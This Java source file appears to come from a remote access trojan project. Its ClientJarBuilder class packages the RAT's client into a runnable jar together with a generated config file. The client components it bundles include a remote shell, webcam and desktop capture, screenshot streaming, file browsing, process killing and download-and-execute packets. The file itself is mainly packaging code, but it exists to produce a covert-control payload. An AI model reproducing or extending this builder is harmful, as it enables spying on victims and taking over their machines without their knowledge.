package rat.utils;

import org.apache.commons.io.IOUtils;
import rat.client.ClientConnection;
import rat.client.ClientMain;
import rat.client.ConnectionHandler;
import rat.client.functions.RemoteDesktop;
import rat.client.functions.RemoteShell;
import rat.client.functions.RemoteWebcam;
import rat.client.functions.ScreenshotSender;
import rat.client.gui.ChatFrame;
import rat.client.gui.ChatFrameObserver;
import rat.packets.*;

import java.io.*;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class ClientJarBuilder {

    private static final Class[] CLASSES = new Class[]{ // check if all exist
            /* Packets */
            BasicInformationPacket.class,
            BasicInformationRequestPacket.class,
            ChatMessagePacket.class,
            ChatNudgePacket.class,
            CloseChatPacket.class,
            DirectoryListingPacket.class,
            DownloadExecutePacket.class,
            DriveListingPacket.class,
            FileBrowserPacket.class,
            FileDataPacket.class,
            IPacket.class,
            KillProcessPacket.class,
            MessageBoxPacket.class,
            PacketType.class,
            ProcessInfo.class,
            ProcessListPacket.class,
            ScreenshotDataPacket.class,
            ScreenshotStartPacket.class,
            ScreenshotStopPacket.class,
            WebsiteOpenPacket.class,
            WebcamDataPacket.class,
            WebcamInfoPacket.class,
            RemoteShellRequestPacket.class,
            RemoteShellResponsePacket.class,


            /* Client */
            ClientConnection.class,
            ClientMain.class,
            ConnectionHandler.class,
            ScreenshotSender.class,
            ChatFrame.class,
            ChatFrameObserver.class,
            RemoteShell.class,
            RemoteWebcam.class,
            RemoteDesktop.class,

            /* Utils */
            Util.class,
            FileManager.class
    };

    private static final Path HOME_FOLDER = Paths.get("").toAbsolutePath();

    private static final String LOCAL_RES_PATH = "/clientLib/libs.zip";

    private static final String[] FOLDER_LIB = new String[]{"org"};

    private static Manifest generateManifest() {
        Manifest manifest = new Manifest();
        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
        manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, ClientMain.class.getName());
        //    manifest.getMainAttributes().put(Attributes.Name.CLASS_PATH, "netty-3.10.5.Final.jar
        // commons-lang3-3.4.jar");
        return manifest;
    }

    public static void build(ClientBuild clientBuild) throws IOException {
        extractLibraries(); // Temporarily extract required libraries

        String fileName = clientBuild.getFileName();

        Manifest manifest = generateManifest();
        JarOutputStream jarOutputStream = new JarOutputStream(new FileOutputStream(fileName), manifest);

        // Add all classes
        for (Class cl : CLASSES) {
            addClass(cl, jarOutputStream);
        }

        // Add properties
        String dataText = clientBuild.toString();
        jarOutputStream.putNextEntry(new JarEntry("config.properties"));
        jarOutputStream.write(dataText.getBytes());
        jarOutputStream.closeEntry();

        // Add extracted libraries
        for (int i = 0; i < FOLDER_LIB.length; i++) {
            addFile(HOME_FOLDER.resolve(FOLDER_LIB[i]).toFile(),
                    HOME_FOLDER, jarOutputStream);
        }

        // Remove temporarily extracted libraries
        for (int i = 0; i < FOLDER_LIB.length; i++) {
            Util.deleteFileOrFolder(HOME_FOLDER.resolve(FOLDER_LIB[i]));
        }

        jarOutputStream.close();
    }

    private static void extractLibraries() throws IOException {
        //Get file from resources folder
        InputStream input = ClientJarBuilder.class.getResourceAsStream(LOCAL_RES_PATH);

        ZipInputStream zis = null;
        try {
            zis = new ZipInputStream(input);
            ZipEntry entry;

            while ((entry = zis.getNextEntry()) != null) {

                // Create a file on HDD in the destinationPath directory
                // destinationPath is a "root" folder, where you want to extract your ZIP file
                File entryFile = new File(HOME_FOLDER.toString(), entry.getName());
                if (entry.isDirectory()) {
                    if (!entryFile.exists()) {
                        entryFile.mkdirs();
                    }
                } else {
                    // Make sure all folders exists (they should, but the safer, the better ;-))
                    if (entryFile.getParentFile() != null && !entryFile.getParentFile().exists()) {
                        entryFile.getParentFile().mkdirs();
                    }

                    // Create file on disk...
                    if (!entryFile.exists()) {
                        entryFile.createNewFile();
                    }

                    // and rewrite data from stream
                    OutputStream os = null;
                    try {
                        os = new FileOutputStream(entryFile);
                        IOUtils.copy(zis, os);
                    } finally {
                        IOUtils.closeQuietly(os);
                    }
                }
            }
        } finally {
            IOUtils.closeQuietly(zis);
        }
    }

    private static void addFile(File source, Path relativeFolder, JarOutputStream target) throws IOException {
        if (source.isDirectory()) {
            String name = relativeFolder.relativize(source.toPath()).toString().replace("\\", "/");
            if (!name.isEmpty()) {
                if (!name.endsWith("/")) {
                    name += "/";
                }
                JarEntry entry = new JarEntry(name);
                entry.setTime(source.lastModified());
                target.putNextEntry(entry);
                target.closeEntry();
            }
            for (File nestedFile : source.listFiles()) {
                addFile(nestedFile, relativeFolder, target);
            }
        } else {
            try (BufferedInputStream in = new BufferedInputStream(new FileInputStream(source))) {
                JarEntry entry = new JarEntry(relativeFolder.relativize(source.toPath()).toString().replace("\\", "/"));
                entry.setTime(source.lastModified());
                target.putNextEntry(entry);

                byte[] buffer = new byte[1024];
                while (true) {
                    int count = in.read(buffer);
                    if (count == -1)
                        break;
                    target.write(buffer, 0, count);
                }
                target.closeEntry();
            }
        }
    }

    private static void addClass(Class c, JarOutputStream jarOutputStream) throws IOException {
        String path = c.getName().replace('.', '/') + ".class";
        jarOutputStream.putNextEntry(new JarEntry(path));
        jarOutputStream.write(Util.toByteArray(c.getClassLoader().getResourceAsStream(path)));
        jarOutputStream.closeEntry();

        for (Class child : c.getDeclaredClasses()) {
            addClass(child, jarOutputStream);
        }

        for (int i = 1; ; i++) {
            try {
                Class child = Class.forName(c.getName() + "$" + i);
                addClass(child, jarOutputStream);
            } catch (Exception ex) {
                break;
            }
        }
    }
}
